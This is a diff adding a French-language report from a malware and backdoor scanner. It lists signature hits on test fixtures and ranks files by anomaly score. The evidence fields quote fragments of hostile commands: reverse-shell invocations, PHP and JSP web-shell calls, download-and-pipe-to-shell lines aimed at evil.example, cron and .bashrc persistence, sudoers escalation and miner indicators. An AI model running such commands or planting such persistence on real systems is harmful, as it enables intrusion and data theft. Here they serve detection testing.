@@ -1,0 +1,160 @@
+SENTINEL
+overall_severity: critical
+severity_counts: critical=12 high=20 medium=6 low=0
+integrity_counts: added=0 removed=0 modified=0 mode_changed=0
+
+findings:
+[medium] SIG-0009 fixtures/sig/inject.sh:1
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: $(curl
+[medium] SIG-0009 fixtures/sig/inject.sh:2
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: `wget
+[medium] SIG-0009 fixtures/sig/inject.sh:3
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: ;rm -rf
+[medium] SIG-0009 fixtures/sig/inject.sh:4
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: && curl
+[critical] SIG-0012 fixtures/sig/jndi.txt:1
+  Log4Shell : lookup ${jndi:
+  evidence: ${jndi:
+[critical] SIG-0001 fixtures/sig/webshell.php:2
+  Web shell PHP : eval, base64_decode ou commande shell sur une entrée HTTP
+  evidence: eval(base64_decode(
+[critical] SIG-0008 fixtures/sig/id_rsa:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN RSA PRIVATE KEY-----
+[high] SIG-0014 fixtures/sig/.bashrc:1
+  Persistance shell dans .bashrc, .profile, .zshrc ou .bash_profile
+  evidence: wget
+[medium] SIG-0010 fixtures/sig/headers.txt:2
+  User-Agent d'outil d'attaque ou de client scripté
+  evidence: User-Agent: sqlmap/1.7
+[critical] SIG-0008 fixtures/sig/openssh_key:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN OPENSSH PRIVATE KEY-----
+[medium] SIG-0016 fixtures/sig/ld_preload.sh:1
+  LD_PRELOAD ou LD_LIBRARY_PATH pointant vers /tmp
+  evidence: LD_PRELOAD=/tmp
+[high] SIG-0007 fixtures/sig/authorized_keys:1
+  Clé SSH publique ajoutée dans authorized_keys
+  evidence: ssh-ed25519
+[high] SIG-0007 fixtures/sig/authorized_keys:2
+  Clé SSH publique ajoutée dans authorized_keys
+  evidence: ssh-rsa
+[critical] SIG-0008 fixtures/sig/ec_private.pem:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN EC PRIVATE KEY-----
+[high] SIG-0004 fixtures/sig/encoded.txt:1
+  Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)
+  evidence: base64 -d payload.b64 | sh
+[high] SIG-0004 fixtures/sig/encoded.txt:2
+  Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)
+  evidence: eval(atob(
+[high] SIG-0004 fixtures/sig/encoded.txt:3
+  Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)
+  evidence: powershell -enc
+[critical] SIG-0001 fixtures/sig/bad_utf8.php:1
+  Web shell PHP : eval, base64_decode ou commande shell sur une entrée HTTP
+  evidence: eval(base64_decode(
+[high] SIG-0015 fixtures/sig/sudoers:1
+  Modification d'identités (passwd :0:0: ou sudoers NOPASSWD / ALL=(ALL))
+  evidence: NOPASSWD: ALL
+[high] SIG-0003 fixtures/sig/crontab.txt:1
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: l http://evil.example/a | sh
+[high] SIG-0003 fixtures/sig/crontab.txt:2
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: - http://evil.example/b | bash
+[high] SIG-0006 fixtures/sig/crontab.txt:1
+  Persistance cron (@reboot, ou cinq champs * ou */N, avec curl, wget ou nc)
+  evidence: @reboot
+[high] SIG-0006 fixtures/sig/crontab.txt:2
+  Persistance cron (@reboot, ou cinq champs * ou */N, avec curl, wget ou nc)
+  evidence: wget
+[critical] SIG-0011 fixtures/sig/webshell.jsp:1
+  Web shell JSP/ASP (Runtime.exec, Execute ou eval request dans un bloc <% )
+  evidence: <% Runtime.getRuntime().exec(
+[high] SIG-0003 fixtures/sig/download.sh:1
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: L http://evil.example/x | sh
+[high] SIG-0003 fixtures/sig/download.sh:2
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: - http://evil.example/x | bash
+[high] SIG-0003 fixtures/sig/download.sh:3
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: python -c 'import urllib; exec(
+[critical] SIG-0008 fixtures/sig/pkcs8.pem:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN PRIVATE KEY-----
+[critical] SIG-0002 fixtures/sig/reverse.sh:1
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: bash -i
+[critical] SIG-0002 fixtures/sig/reverse.sh:2
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: nc -e
+[critical] SIG-0002 fixtures/sig/reverse.sh:3
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: ncat
+[critical] SIG-0002 fixtures/sig/reverse.sh:4
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: socat tcp-listen:4444,reuseaddr exec
+[high] SIG-0015 fixtures/sig/passwd:1
+  Modification d'identités (passwd :0:0: ou sudoers NOPASSWD / ALL=(ALL))
+  evidence: :0:0:
+[high] SIG-0005 fixtures/sig/miner.conf:1
+  Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)
+  evidence: stratum+tcp
+[high] SIG-0005 fixtures/sig/miner.conf:2
+  Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)
+  evidence: xmrig
+[high] SIG-0005 fixtures/sig/miner.conf:3
+  Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)
+  evidence: minerd
+[high] SIG-0013 fixtures/sig/.htaccess:1
+  Directive .htaccess dangereuse (auto_prepend ou AddType PHP)
+  evidence: php_value auto_prepend_file
+[high] SIG-0013 fixtures/sig/.htaccess:2
+  Directive .htaccess dangereuse (auto_prepend ou AddType PHP)
+  evidence: AddType application/x-httpd-php
+
+anomalies : autoencodeur neuronal (V3, score = MSE reconstruit × 100)
+- tests/__init__.py score=100 — entropy=0.000000, max_line_len=0, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=0.0
+- tests/test_signatures.py score=100 — entropy=4.797227, max_line_len=97, nonprintable_ratio=0.0, shell_metachar_ratio=0.05536568694463431, avg_line_len=40.3
+- tests/high_entropy.txt score=100 — entropy=5.974256, max_line_len=800, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=800.0
+- tests/test_neural.py score=100 — entropy=4.665562, max_line_len=91, nonprintable_ratio=0.0, shell_metachar_ratio=0.04411343454597536, avg_line_len=35.7
+- tests/fixtures/sig/jndi.txt score=100 — entropy=4.941883, max_line_len=127, nonprintable_ratio=0.0, shell_metachar_ratio=0.0234375, avg_line_len=127.0
+- tests/fixtures/sig/webshell.php score=100 — entropy=4.843095, max_line_len=33, nonprintable_ratio=0.0, shell_metachar_ratio=0.14583333333333334, avg_line_len=23.0
+- tests/fixtures/sig/id_rsa score=100 — entropy=4.080651, max_line_len=31, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=27.7
+- tests/fixtures/sig/.bashrc score=100 — entropy=4.565280, max_line_len=53, nonprintable_ratio=0.0, shell_metachar_ratio=0.1111111111111111, avg_line_len=53.0
+- tests/fixtures/sig/headers.txt score=100 — entropy=4.704784, max_line_len=22, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=20.3
+- tests/fixtures/sig/openssh_key score=100 — entropy=4.471818, max_line_len=35, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=31.7
+- tests/fixtures/sig/ld_preload.sh score=100 — entropy=4.502583, max_line_len=30, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=30.0
+- tests/fixtures/sig/authorized_keys score=100 — entropy=4.826227, max_line_len=77, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=76.0
+- tests/fixtures/sig/ec_private.pem score=100 — entropy=4.042957, max_line_len=30, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=26.3
+- tests/fixtures/sig/encoded.txt score=100 — entropy=5.330167, max_line_len=60, nonprintable_ratio=0.0, shell_metachar_ratio=0.03787878787878788, avg_line_len=43.0
+- tests/fixtures/sig/bad_utf8.php score=100 — entropy=4.805911, max_line_len=43, nonprintable_ratio=0.0, shell_metachar_ratio=0.20454545454545456, avg_line_len=43.0
+- tests/fixtures/sig/sudoers score=100 — entropy=4.066677, max_line_len=32, nonprintable_ratio=0.0, shell_metachar_ratio=0.06060606060606061, avg_line_len=32.0
+- tests/fixtures/sig/webshell.jsp score=100 — entropy=4.365430, max_line_len=61, nonprintable_ratio=0.0, shell_metachar_ratio=0.14516129032258066, avg_line_len=61.0
+- tests/fixtures/sig/pkcs8.pem score=100 — entropy=4.520340, max_line_len=55, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=35.7
+- tests/fixtures/sig/reverse.sh score=100 — entropy=4.496027, max_line_len=48, nonprintable_ratio=0.0, shell_metachar_ratio=0.02702702702702703, avg_line_len=36.0
+- tests/fixtures/sig/passwd score=100 — entropy=3.949205, max_line_len=36, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=36.0
+- tests/fixtures/sig/crontab.txt score=87 — entropy=4.520618, max_line_len=53, nonprintable_ratio=0.0, shell_metachar_ratio=0.02127659574468085, avg_line_len=46.0
+- tests/fixtures/sig/.htaccess score=77 — entropy=4.311858, max_line_len=38, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=37.0
+- tests/fixtures/sig/download.sh score=73 — entropy=4.809013, max_line_len=87, nonprintable_ratio=0.0, shell_metachar_ratio=0.05454545454545454, avg_line_len=54.0
+- tests/test_scan_empty.py score=48 — entropy=4.363581, max_line_len=83, nonprintable_ratio=0.0, shell_metachar_ratio=0.025619128949615714, avg_line_len=34.5
+- tests/fixtures/sig/miner.conf score=36 — entropy=4.456129, max_line_len=33, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=24.0
+- tests/fixtures/sig/inject.sh score=31 — entropy=4.582578, max_line_len=42, nonprintable_ratio=0.0, shell_metachar_ratio=0.075, avg_line_len=29.0
+- tests/fixtures/benign/client.js score=20 — entropy=4.554243, max_line_len=60, nonprintable_ratio=0.0, shell_metachar_ratio=0.12267657992565056, avg_line_len=23.5
+- tests/fixtures/benign/README.md score=11 — entropy=4.595763, max_line_len=41, nonprintable_ratio=0.0, shell_metachar_ratio=0.04195804195804196, avg_line_len=12.0
+- tests/fixtures/benign/config.json score=5 — entropy=4.435864, max_line_len=55, nonprintable_ratio=0.0, shell_metachar_ratio=0.0136986301369863, avg_line_len=19.9
+- tests/fixtures/benign/metadata.txt score=4 — entropy=4.654476, max_line_len=79, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=28.1
+- tests/fixtures/benign/utils.py score=3 — entropy=4.389876, max_line_len=36, nonprintable_ratio=0.0, shell_metachar_ratio=0.06666666666666667, avg_line_len=9.6
+- tests/fixtures/benign/styles.css score=2 — entropy=4.457174, max_line_len=28, nonprintable_ratio=0.0, shell_metachar_ratio=0.0625, avg_line_len=11.0
+
+integrity:
+added: (aucun)
+removed: (aucun)
+modified: (aucun)
+mode_changed: (aucun)
